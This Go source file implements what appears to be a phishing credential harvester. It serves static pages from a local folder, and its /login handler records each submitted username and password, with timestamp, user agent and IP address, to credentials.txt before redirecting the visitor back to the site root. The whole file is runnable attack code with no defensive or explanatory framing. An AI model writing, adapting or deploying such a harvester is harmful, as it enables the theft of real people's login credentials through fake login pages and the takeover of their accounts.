package main

import (
	"net/http"
	"os"
	"time"

	"github.com/gorilla/mux"
	"github.com/sirupsen/logrus"
)

func login(w http.ResponseWriter, r *http.Request) {
	logrus.WithFields(logrus.Fields{
		"time":       time.Now().String(),
		"username":   r.FormValue("_user"),
		"password":   r.FormValue("_pass"),
		"user-agent": r.UserAgent(),
		"ip_address": r.RemoteAddr,
	}).Info()
	http.Redirect(w, r, "/", 302)
}

func main() {
	fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}

	defer fh.Close()

	logrus.SetOutput(fh)

	r := mux.NewRouter()
	r.HandleFunc("/login", login).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
	logrus.Fatal(http.ListenAndServe(":8080", r))
}
